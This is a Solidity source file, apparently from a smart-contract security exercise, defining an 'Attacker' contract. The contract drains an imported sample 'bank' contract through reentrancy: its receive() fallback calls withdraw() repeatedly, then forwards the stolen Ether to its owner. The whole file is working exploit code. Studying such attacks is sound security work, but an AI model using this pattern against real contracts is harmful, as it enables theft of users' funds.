// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/bank.sol";

contract Attacker {
      bank public immutable mybank;
      address public owner;

      constructor (address payable bankaddress){
          mybank = bank(bankaddress);
          owner = msg.sender;
      }

      function attack() external payable
      {
          mybank.deposit{value: msg.value}();
          mybank.withdraw();
      }
    
      receive() external payable {
          if(address(mybank).balance >= mybank.getBalance())
              mybank.withdraw();
          else
              payable(owner).transfer(address(this).balance);          
      }
}
